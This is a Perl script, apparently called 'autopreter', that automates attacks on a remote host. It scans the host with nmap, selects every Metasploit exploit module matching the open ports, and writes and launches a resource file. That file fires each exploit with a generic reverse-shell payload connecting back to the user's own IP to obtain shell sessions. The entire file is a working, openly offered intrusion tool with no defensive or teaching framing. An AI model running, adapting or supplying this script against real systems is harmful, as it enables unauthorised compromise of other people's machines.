#!/usr/bin/perl
use strict;
use Cwd qw();
my $path = Cwd::cwd();
if ($path !~ m/metasploit/) {
  print ("err: Your current working directory must be metasploit's.\n");
  exit(1);
}
print("autopreter by oxagast\n");
if($#ARGV < 1) {
  print("Useage: ./autopreter.pl <remoteip> <yourip>\n\n");
  print("  If you can't get a shell, your firewall may be blocking it\n");
  print("  Please allow 15 minutes for the process to complete...\n");
  print("  Once sessions are displayed, if you have an active session\n");
  print("  type sessions 1\n");
  exit(1);
}
if(`id` !~ m/root/) {
  print("err: Must be run as root on the local machine.\n");
  exit(1);
}
my $lhost = $ARGV[1];
my $rhost = $ARGV[0];
print("trying to spawn a shell from $rhost...\n");
unlink("masspwn.nmap");
unlink("masspwn.msf");
system("nmap $rhost -O -oG masspwn.nmap >/dev/null");
my $nms = `cat masspwn.nmap`;
my @nmap;
@nmap = split("\n", $nms);
@nmap[1] =~ m/Host: (\d+\.\d+\.\d+\.\d+)/;
$rhost = $1;
my @port;
my @nport;
my @modules;
@port = split("/open", @nmap[2]);
@port[0] =~ s/.*Ports: //;
push(@nport, @port[0]);
foreach (@port) {
  $_ =~ m/.*, (\d+)/;
  push(@nport, $1);
}
foreach(@nport) {
  my $curport = $_;
  my @moduledir = `grep RPORT modules/ -R | grep \\($curport\\) | grep exploit`;
  foreach(@moduledir) {
    my $curmod = $_;
    $curmod =~ m/.*\/(exploit.*)\.rb\:.*/;
    push(@modules, $1);
  }
}
my @umods;
my %seen;
foreach my $value (@modules) {
  if (! $seen{$value}) {
    push @umods, $value;
    $seen{$value} = 1;
  }
}
@nmap[2] =~ m/.*OS: (\w+) /;
my $os = $1;
my $los = lc($os);
my $handler = 2000;;
my $fh;
open($fh, ">", "masspwn.msf");
foreach(@umods) {
  print($fh "use $_\n");
  print($fh "set RHOST $rhost\n");
  print($fh "set LHOST $lhost\n");
  print($fh "set LPORT $handler\n");
  print($fh "set ExitOnSession false\n");
  print($fh "set PAYLOAD generic_shell_reverse\n");
  print($fh "exploit -j -z\n");
  $handler++;
}
print($fh "jobs -K\n");
print($fh "sessions\n");

system("./msfconsole -r masspwn.msf");
exit(0);
